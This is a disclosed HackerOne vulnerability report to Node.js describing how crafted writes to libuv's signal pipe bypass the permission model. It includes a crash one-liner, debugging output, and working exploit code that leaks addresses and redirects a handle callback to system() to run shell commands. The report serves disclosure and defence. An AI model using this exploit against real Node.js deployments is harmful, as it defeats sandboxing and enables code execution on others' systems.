# Permissions can be bypassed via arbitrary code execution through abusing libuv signal pipes

## Report Details
- **Report ID**: 2260337
- **URL**: https://hackerone.com/reports/2260337
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2023-11-21T21:26:51.903Z
- **Disclosed**: 2024-08-08T15:38:05.530Z

## Reporter
- **Username**: xion
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:**

Sending specific crafted messages to Node.js libuv signal event pipe allows an attacker to obtain arbitrary code execution primitives, bypassing any module-based permissions and process-based permissions enforced.

**Description:**

Node.js uses [libuv](https://github.com/libuv/libuv) which uses pipes to signal and handle events in order to support asynchronous I/O event loops. As communication between pipes are trusted it is possible to send a specific crafted message to the pipe to obtain arbitrary code execution, bypassing any module-based permissions and process-based permissions enforced.

This vulnerability is reproducible even under the most restrictive policies (module-based permissions) and permission models (process-based permissions) available on latest Node.js version.

## Steps To Reproduce:

1. Download and untar {F2874430}. This is a Dockerized repro based on `node:20.9.0-alpine3.17` image on digest `sha256:b82ef5b38a306323dfcce05eb0d60bc568d7cf69967afb21bd42d7deaecd558e`.

```text
$ tar xvf repro.tar.gz
code.js
Dockerfile
policy.json
run.sh
```

2. Run `./run.sh`. This will build the repro image and run the container, where the exploit code `code.js` runs within the most restrictive policies and permissions model possible.
   - Module-based permissions: No dependencies allowed for the exploit code
   - Process-based permissions: `allow-fs-read` only for two files, policy file `/policy.json` and exploit code `/code.js`.
   - Additional flags such as `--noexpose_wasm` to additionally remove trivial attack vectors (WASI)

```text
$ ./run.sh
[+] Building 0.0s (7/7) FINISHED                                                                                                                                                         docker:default
 => [internal] load .dockerignore                                                                                                                                                                  0.0s
 => => transferring context: 2B                                                                                                                                                                    0.0s
 => [internal] load build definition from Dockerfile                                                                                                                                               0.0s
 => => transferring dockerfile: 592B                                                                                                                                                               0.0s
 => [internal] load metadata for docker.io/library/node:20.9.0-alpine3.17@sha256:b82ef5b38a306323dfcce05eb0d60bc568d7cf69967afb21bd42d7deaecd558e                                                  0.0s
 => [internal] load build context                                                                                                                                                                  0.0s
 => => transferring context: 2.10kB                                                                                                                                                                0.0s
 => [1/2] FROM docker.io/library/node:20.9.0-alpine3.17@sha256:b82ef5b38a306323dfcce05eb0d60bc568d7cf69967afb21bd42d7deaecd558e                                                                    0.0s
 => CACHED [2/2] COPY code.js policy.json /                                                                                                                                                        0.0s
 => exporting to image                                                                                                                                                                             0.0s
 => => exporting layers                                                                                                                                                                            0.0s
 => => writing image sha256:b8194f61f74b5dcaa9cca0ecb47d102b9db14dc9285b7443a1c0f3b017285b1a                                                                                                       0.0s
 => => naming to docker.io/library/repro                                                                                                                                                           0.0s
buf:  0x7fe5a0a297c0
musl: 0x7fe5a3702000
go!
done!
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

{F2874191}

## Analysis:

This is a step-by-step in-depth analysis of the exploit.

1. Triggering the libuv crash

We first identify the vulnerability by triggering a crash from libuv. Running the following immediately yields a crash (if the host supports io_uring). If not, try it with `11` instead of `15` for the first argument (if host does not support io_uring, 4 fds not opened).

```text
$ node --version
v20.9.0
$ node -e 'process.stdout.constructor(15); process.stdout.write(new Uint8Array(new BigUint64Array([0x133700000000n, 0x133800000000n]).buffer));'
Segmentation fault (core dumped)
```

`process.stdout.constructor` refers to [WriteStream](https://github.com/nodejs/node/blob/v20.9.0/lib/tty.js#L84). Calling this function with `15` indicates that we create a new `TTY` object with file descriptor set to `15`, and set this as stdout. This effectively changes all following stdout writes to write on fd `15` instead of the original fd `1`.

```js
// lib/tty.js#L84
function WriteStream(fd) {
  if (!(this instanceof WriteStream))
    return new WriteStream(fd);
  if (fd >> 0 !== fd || fd < 0)
    throw new ERR_INVALID_FD(fd);

  const ctx = {};
  const tty = new TTY(fd, ctx);
  if (ctx.code !== undefined) {
    throw new ERR_TTY_INIT_FAILED(ctx);
  }

  net.Socket.call(this, {
    readableHighWaterMark: 0,
    handle: tty,
    manualStart: true,
  });
```

We can verify this by strace:

```
$ strace node -e 'process.stdout.constructor(15); process.stdout.write(new Uint8Array(new BigUint64Array([0x133700000000n, 0x133812345678n]).buffer));'
// omitted
ioctl(15, TCGETS, 0x7ffcdd0a5380)       = -1 ENOTTY (Inappropriate ioctl for device)
fstat(15, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
fcntl(15, F_GETFL)                      = 0x801 (flags O_WRONLY|O_NONBLOCK)
ioctl(15, FIONBIO, [1])                 = 0
ioctl(15, FIONBIO, [0])                 = 0
ioctl(15, TIOCGWINSZ, 0x7ffcdd0a5708)   = -1 ENOTTY (Inappropriate ioctl for device)
write(15, "\0\0\0\0007\23\0\0xV4\228\23\0\0", 16) = 16
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

The constructor call results in fd `15` to be considered as stdout tty fd. It responds with `ENOTTY` on some tty-related ioctls but still continues fine until `process.stdout.write()` call sends the payload. This results in a segfault.

2. Identifying the segfault

To identify why we have crashed, we first check what fd `15` is. Below is a list of file descriptors for a reference Node.js process.

```text
$ ls -alF /proc/10530/fd/
total 0
dr-x------ 2 root root 28 Nov 22 03:54 ./
dr-xr-xr-x 9 root root  0 Nov 22 03:54 ../
lrwx------ 1 root root 64 Nov 22 03:54 0 -> /dev/pts/0
lrwx------ 1 root root 64 Nov 22 03:54 1 -> /dev/pts/0
lrwx------ 1 root root 64 Nov 22 03:54 10 -> 'anon_inode:[eventfd]'
lrwx------ 1 root root 64 Nov 22 03:54 11 -> 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Nov 22 03:54 12 -> 'anon_inode:[io_uring]'
lrwx------ 1 root root 64 Nov 22 03:54 13 -> 'anon_inode:[io_uring]'
lr-x------ 1 root root 64 Nov 22 03:54 14 -> 'pipe:[117933]'
l-wx------ 1 root root 64 Nov 22 03:54 15 -> 'pipe:[117933]'
lrwx------ 1 root root 64 Nov 22 03:54 16 -> 'anon_inode:[eventfd]'
lrwx------ 1 root root 64 Nov 22 03:54 17 -> 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Nov 22 03:54 18 -> 'anon_inode:[io_uring]'
lrwx------ 1 root root 64 Nov 22 03:54 19 -> 'anon_inode:[io_uring]'
lrwx------ 1 root root 64 Nov 22 03:54 2 -> /dev/pts/0
lr-x------ 1 root root 64 Nov 22 03:54 20 -> 'pipe:[104958]'
l-wx------ 1 root root 64 Nov 22 03:54 21 -> 'pipe:[104958]'
lrwx------ 1 root root 64 Nov 22 03:54 22 -> 'anon_inode:[eventfd]'
lrwx------ 1 root root 64 Nov 22 03:54 23 -> /dev/pts/0
lr-x------ 1 root root 64 Nov 22 03:54 24 -> /dev/null
lrwx------ 1 root root 64 Nov 22 03:54 25 -> /dev/pts/0
lrwx------ 1 root root 64 Nov 22 03:54 26 -> /dev/pts/0
lrwx------ 1 root root 64 Nov 22 03:54 3 -> 'anon_inode:[eventpoll]'
lrwx------ 1 root root 64 Nov 22 03:54 4 -> 'anon_inode:[io_uring]'
lrwx------ 1 root root 64 Nov 22 03:54 5 -> 'anon_inode:[io_uring]'
lr-x------ 1 root root 64 Nov 22 03:54 6 -> 'pipe:[104952]'
l-wx------ 1 root root 64 Nov 22 03:54 7 -> 'pipe:[104952]'
lr-x------ 1 root root 64 Nov 22 03:54 8 -> 'pipe:[104953]'
l-wx------ 1 root root 64 Nov 22 03:54 9 -> 'pipe:[104953]'
```

We see that fd `15` corresponds to a pipe's writer side fd, with its corresponding reader side fd on `14`.

We then check the crash site via gdb, which reveals that we have crash at the following [libuv code](https://github.com/nodejs/node/blob/v20.9.0/deps/uv/src/unix/signal.c#L461):

```c
// deps/uv/src/unix/signal.c#L35
typedef struct {
  uv_signal_t* handle;
  int signum;
} uv__signal_msg_t;

// deps/uv/src/unix/signal.c#L431
    r = read(loop->signal_pipefd[0], buf + bytes, sizeof(buf) - bytes);

// deps/uv/src/unix/signal.c#L457
    for (i = 0; i < end; i += sizeof(uv__signal_msg_t)) {
      msg = (uv__signal_msg_t*) (buf + i);
      handle = msg->handle;

      if (msg->signum == handle->signum) {                // crash on handle->signum dereference
        assert(!(handle->flags & UV_HANDLE_CLOSING));
        handle->signal_cb(handle, handle->signum);
      }

      handle->dispatched_signals++;

      if (handle->flags & UV_SIGNAL_ONE_SHOT)
        uv__signal_stop(handle);
    }
```

We now see that this is the pipe reader side code for fd `14`. As we have sent `new BigUint64Array([0x133700000000n, 0x133812345678n])` from our test code, `handle` is now `0x133700000000` and `msg->signum == 0x12345678`.  libuv segfaulted on this `handle` value.

Note that if we have a controlled data on known address, we can easily make this an arbitrary function call. This is because we can point `handle` to the known address, satisfy the `msg->signum == handle->signum` constraint as well as the `assert()` call to reach `handle->signal_cb(handle, handle->signum)`. `handle->signal_cb` is our controlled data, and what's also good is that the first argument is `handle` itself - it would be best if we can make this into an arbitrary `system(cmd)` call.

3. Leaking addresses

For node binaries linked to glibc PIE seems to be disabled, which allows exploiting the binary in a easier manner as the node binary address is fixed. This is not the case for other node binaries, for example musl-linked node used for alpine-based Node.js docker images. Thus to exploit the vulnerability to obtain a full `system(cmd)` call, the exploit must first leak addresses.

Leaking addresses are easily done by using [uninitialized `Buffer`](https://nodejs.org/docs/latest-v20.x/api/buffer.html). After depleting the initial `Buffer` pool by allocating [~0x2000 bytes](https://github.com/nodejs/node/blob/v20.9.0/lib/buffer.js#L150), we receive a new pool that is filled with garbage data that the previous allocations have used.

This leaks the `Buffer` backing memory address at index 6, and an address at index 5 which has a constant offset from musl library base.

```js
// repro/code.js#L28
const fill = [];
for (let i = 0; i < 0x3f9; i++) {
    fill.push(Buffer.from("A"));
}
const dump_orig = Buffer.from("MARK").buffer;
const dump = Buffer.from(dump_orig);
const dump64 = tele(dump);

//console.log(dump64);

const buf = dump64[6] - 0x20n;
console.log(`buf:  0x${buf.toString(16)}`);
assert(dump64[4] === 0x007265666675425fn);          // "_Buffer"
assert((buf & 0xfffn) === 0x7c0n);

const musl = dump64[5] - 0x40a68n + 0x315000n;
console.log(`musl: 0x${musl.toString(16)}`);
assert((musl & 0xfffn) === 0n);
```

4. Popping shell

Now that we have leaked the libc base and the address of backing store of a `Buffer`, we can use this to call arbitrary `system(cmd)`. Using `DataView` to modify the `Buffer` contents at known address, we set `handle->signal_cb = system`, `handle->signum == msg->signum` and write our desired command to `handle`. We finally send the payload `sigmsg` to trigger the vulnerability and call arbitrary shell commands. In the repro exploit code, `id > /proc/${process.pid}/fd/1` is called to demonstrate that we have indeed popped shell.

```js
// repro/code.js#L47
const view = new DataView(dump_orig);
const sigmsg = new BigUint64Array(0x2);

const cmd = `id > /proc/${process.pid}/fd/1\0`;
assert(cmd.length <= 0x60);
for (let i = 0; i < cmd.length; i++) {
    view.setUint8(i, cmd.charCodeAt(i));
}
view.setBigUint64(0x60, ntoh(musl + 0x423a1n));     // handle->signal_cb = system
view.setBigUint64(0x68, ntoh(0x1337c0d3n));         // handle->signum = 0x1337c0d3

sigmsg[0] = buf;                                    // handle = buf
sigmsg[1] = 0x1337c0d3n;                            // msg->signum = 0x1337c0d3

console.log('go!');
process.on('exit', () => {
    process.stdout.constructor(1);
    process.stdout.write("done!\n");
});
try {
    process.stdout.constructor(11);	// no io_uring
} catch {
    process.stdout.constructor(15);     // supports io_uring
}
process.stdout.write(new Uint8Array(sigmsg.buffer));
process.exit();
```

**Fix:**

There are multiple factors to consider when fixing this vulnerability:
1. Filesystem permissions for process-based permissions currently do not implement any defense against already opened file descriptors, implicitly trusting them to be within the enforced permission model. This report proves that this is not the case.
2. Even after exhaustively implementing proper filesystem permissions over already opened file descriptors on `node:fs`, there may be other ways to interact with file descriptor. This report shows one case of using `process.{stdin,stdout,stderr}.constructor` to reset a TTY, enabling arbitrary writes on any file descriptors. It is difficult to check whether or not we've covered all cases.

As such, the reporter currently does not have a concrete idea on a comprehensive fix. Minimizing attack surface by denying access to `process` may be a good starting point.

## Impact

This vulnerability allows attackers to bypass the experimental permission model and gain arbitrary code execution, even under the most restrictive policies and permission models currently available.

## Attachments
- poc.mp4
- repro.tar.gz
